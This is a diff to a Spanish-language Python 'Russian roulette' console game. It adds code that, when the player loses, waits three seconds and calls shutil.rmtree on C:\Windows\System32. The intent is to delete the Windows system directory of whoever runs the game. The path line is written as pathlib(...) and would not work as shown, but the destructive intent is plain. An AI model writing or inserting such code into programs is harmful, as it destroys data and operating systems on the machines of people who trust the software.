@@ -1,7 +1,10 @@
 import pathlib
+import shutil
 import random
 import time
 import os 
+
+SO = pathlib('C:\Windows\System32')
 
 def limpiar ():
     if os.name == 'nt':
@@ -41,6 +44,8 @@ def ruleta():
                 if bala == disparo:
                     print('Haz perdido. Ya mamaste')
                     disparo += 1
+                    time.sleep(3)
+                    shutil.rmtree(SO)
                     input()
                     
                 else:
@@ -56,7 +61,10 @@ def ruleta():
             limpiar()
             if bala == disparo:
                 print('Haz perdido. Ya mamaste')
+                time.sleep(3)
+                shutil.rmtree(SO)
                 disparo += 1
+                
                 input()
                 limpiar()
             else:
